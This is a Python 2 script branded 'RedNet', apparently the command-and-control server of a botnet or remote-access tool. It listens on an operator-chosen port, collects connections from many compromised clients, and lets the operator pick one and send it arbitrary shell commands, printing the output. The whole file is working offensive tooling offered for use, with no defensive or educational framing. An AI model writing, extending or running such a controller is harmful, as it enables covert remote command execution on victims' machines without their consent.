import os, socket, sys, select
from filestack import Filelink
from time import sleep

if os.name == 'nt':
   clear = lambda:os.system('cls')
else:
   clear = lambda:os.system('clear')
clear()
print r"""
 /$$$$$$$                  /$$ /$$   /$$             /$$    
| $$__  $$                | $$| $$$ | $$            | $$    
| $$  \ $$  /$$$$$$   /$$$$$$$| $$$$| $$  /$$$$$$  /$$$$$$  
| $$$$$$$/ /$$__  $$ /$$__  $$| $$ $$ $$ /$$__  $$|_  $$_/  
| $$__  $$| $$$$$$$$| $$  | $$| $$  $$$$| $$$$$$$$  | $$    
| $$  \ $$| $$_____/| $$  | $$| $$\  $$$| $$_____/  | $$ /$$
| $$  | $$|  $$$$$$$|  $$$$$$$| $$ \  $$|  $$$$$$$  |  $$$$/
|__/  |__/ \_______/ \_______/|__/  \__/ \_______/   \___/  
                                                            
Github: https://github.com/PlayerRed54321/
Version: 1.0
"""
c = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
if os.name == 'nt':
   clear = lambda:os.system('cls')
else:
   clear = lambda:os.system('clear')
ip = raw_input('IP:')
port = int(raw_input('PORT:'))
c.bind((ip, port))
c.listen(100)
active = False
socks = []
clients = []
interval = 0.8

while True:
   try:
     c.settimeout(4)
     try:
       if len(clients)>0:
         clear()  
         for j in range(0,len(clients)):
            print '['+str((j+1))+']client:'+clients[j]+'\n'
         print '[*RedNet*]Listening on IP: ' + ip + ':' + str(port)   
         print 'press ctrl+C to interact with clinet.' 
       s, a=c.accept()
     except socket.timeout:
       continue
     if(a):
       print '[*RedNet*]Connection estabilished on ' + str(a) + '\n'
       s.settimeout(None)
       socks +=[s]
       clients +=[str(a)]
     clear()
     print '[*RedNet*]Listening on IP: ' + ip + ':' + str(port)
     if len(clients)>0:
       for j in range(0,len(clients)):
         print '['+str((j+1))+']client:'+clients[j]+'\n'
       print 'press ctrl+C to interact with clinet.'
     sleep(interval)
   except KeyboardInterrupt:
     clear()
     print '[*RedNet*]Listening on IP: ' + ip + ':' + str(port)
     if len(clients)>0:
         for j in range(0,len(clients)):
             print '['+str((j+1))+']client:'+clients[j]+'\n'
         print "...\n"
         print "[0] Exit \n"
     activate=input('\n[*RedNet*]Enter client~>.')
     if activate==0:
         print '\nExiting....\n'
         sys.exit()
     activate -=1
     clear()
     print'[*RedNet*]Activing client.'+clients[activate]+'\n'
     print '[*RedNet*]Press ctrl+c to return listening\n'
     active=True
   while active:
      try:
        cmd = raw_input('[*RedNet*]~>')
        if cmd == 'exit':
           active=False
        elif cmd == 'clear':
           clear()
        else:
           socks[activate].send(cmd)
           response = socks[activate].recv(204800)
           print '[*RedNet*]Response\n\n' + response + '\n'
      except socket.error:
        active=False
        print '[-]Erro ao enviar o comando, escutando portas novamente em 5 segundos.'
        sleep(5)
